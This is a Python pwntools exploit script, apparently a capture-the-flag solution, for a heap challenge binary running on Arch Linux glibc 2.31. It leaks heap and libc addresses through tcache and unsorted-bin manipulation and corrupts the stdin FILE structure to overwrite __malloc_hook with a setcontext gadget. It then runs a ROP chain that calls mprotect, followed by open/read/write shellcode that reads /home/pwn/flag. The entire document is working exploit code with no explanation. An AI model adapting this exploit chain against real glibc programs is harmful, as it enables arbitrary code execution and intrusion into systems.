###Due to _IO_2_1_stdin_ offset in Arch glibc2.31, the exploit procedure is much easier compared to Ubuntu version

from pwn import *
from IO_FILE import *

context.arch = 'amd64'

###Util
def create(size,data):
    r.sendlineafter('choice : ','1')
    r.sendlineafter('length : ',hex(size-4))
    r.sendafter('name : ',data)

def show(idx):
    r.sendlineafter('choice : ','2')
    r.sendlineafter('index : ',hex(idx))
    size = int(r.recvline()[:-1].split(b'ID : ')[1])
    facilities = r.recvline()[:-1].split(b'Name : ')[1]
    return size,facilities

def delete(idx):
    r.sendlineafter('choice : ','3')
    r.sendlineafter('index : ',hex(idx))

def scanf_consolidate():
    r.sendlineafter('choice : ','1'*0x400)

###Addr
#  libc2.31(Arch Linux version)
malloc_hook_offset = 0x1bf9d0
main_arena_offset = 0x1bf9e0
unsorted_bin_offset = main_arena_offset+0x60
stdin_struct_offset = 0x1bf7e0
stdin_bufbase_offset=  stdin_struct_offset+0x38
stdin_shortbuf_offset = stdin_struct_offset+0x83
IO_str_jumps_offset = 0x1c13c0
#memalign_hook_ini_offset = 0x8b3f0
#realloc_hook_ini_offset = 0x8ba80

###ROPgadget
L_nop = 0x3264f
L_pop_rdi = 0x26ae2
L_pop_rsi = 0x39b2e
L_pop_rdx = 0xb686a
L_pop_rax = 0x3ef10
L_syscall = 0x3f119
set_context_gadget = 0x4baad

###Exploit
while True:
    r = process('./H',env={'LD_PRELOAD':'./libc-2.31.so'})

    for i in range(7):
        create(0x28,'M30W') #0
        delete(0)
    create(0x28,'M30W')     #0
    create(0x28,'M30W')     #1
    delete(1)
    delete(0)
    create(0x38,'M30W')     #0
    for i in range(7):
        create(0x38,'M30W') #1
        delete(1)
    delete(0)
    create(0x28,'M30W')     #0
    create(0x28,'M30W')     #1'
    delete(0)
    delete(1)
    create(0x28,'M30W')     #0
    delete(1)
    leaks = show(0)
    heap_addr = leaks[0]+(u32(leaks[1].ljust(4,b'\x00'))<<32)-0x3e0
    print(hex(heap_addr))

    create(0x28,'M30W')     #1
    delete(0)

    scanf_consolidate()
    leaks = show(1)
    unsorted_bin_addr = leaks[0]+(u32(leaks[1].ljust(4,b'\x00'))<<32)
    libc_base = unsorted_bin_addr-unsorted_bin_offset
    print(hex(libc_base))
    if (libc_base+stdin_struct_offset)&0xff00!=0x3700:
        r.close()
        continue
    else:
        break

create(0x18,'M30W') #0
delete(0)
for i in range(5):
    create(0x38,p32(0)+p64(0x21))   #0
    delete(1)
    delete(0)
for i in range(8):
    create(0x38,p32(0)+p64(0xb1)+p64(0)+p64(0)) #0
    delete(1)
    delete(0)
create(0x38,p32(0)+p64(0x21)+p64(heap_addr+0x440)+p64(libc_base+unsorted_bin_offset)+p64(0x20)+p64(0x20)) #0
scanf_consolidate()
create(0x38,p32(0)+p64(0)+p64(0)+p64(0x21)+p64(heap_addr+0x410)+p64(libc_base+stdin_bufbase_offset-0x10-0x7)) #1
delete(0)
create(0x38,p32(0)+p64(0x21)+p64(0)+p64(heap_addr+0x460))   #0
delete(1)

create(0x18,'M30W')   #1

r.recvuntil('choice : ')
r.send('1'*0x18+'07')
sleep(1)

argument = b'/home/pwn/flag\x00'.ljust(0xb0,b'\x00')

IO_file = IO_FILE_plus(arch=64)
stream1 = IO_file.construct(flags = 0xfbad2082,
                            read_ptr = libc_base+stdin_shortbuf_offset, read_end = libc_base+stdin_shortbuf_offset+0x1-0x134,
                            buf_base = libc_base+stdin_struct_offset+0x10, buf_end = libc_base+malloc_hook_offset+0x8,
                            fileno = 0,
                            shortbuf = 0x31)

stream2 = IO_file.construct(read_end = 0,
                            write_base = 0, write_ptr = libc_base+malloc_hook_offset-0x110-0xa0,
                            buf_end = 0x0, buf_base = 0x0,
                            fileno = 0,
                            shortbuf = 0x31,
                            lock = libc_base+stdin_struct_offset-0x20,
                            mode = 0xffffffff,
                            vtable = libc_base+IO_str_jumps_offset-0x10,)

padding2 = p64(0)*0x22

hijacked_malloc_hook = p64(libc_base+set_context_gadget)
stub = p64(libc_base+malloc_hook_offset-0x110+0x10)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64((libc_base+stdin_struct_offset)&0xfffffffffffff000)+\
           p64(libc_base+L_pop_rsi)+p64(0x2000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+malloc_hook_offset-0x110+0x60)

shellcode = asm(f'''
                 mov rdi, {libc_base+stdin_struct_offset-0xb0}
                 mov rsi, 0
                 mov rdx, 0
                 mov rax, 2
                 syscall
                 mov rdi, rax
                 mov rsi, {libc_base+stdin_struct_offset-0xb0}
                 mov rdx, 0x100
                 mov rax, 0
                 syscall
                 mov rdi, 1
                 mov rsi, {libc_base+stdin_struct_offset-0xb0}
                 mov rdx, 0x100
                 mov rax, 1
                 syscall
                 ''')
payload = argument+stream1[:0x84]+stream2[0x10:]+(stub+ROPchain+shellcode).ljust(0x110,b'\x00')+hijacked_malloc_hook
r.send(payload)

r.interactive()

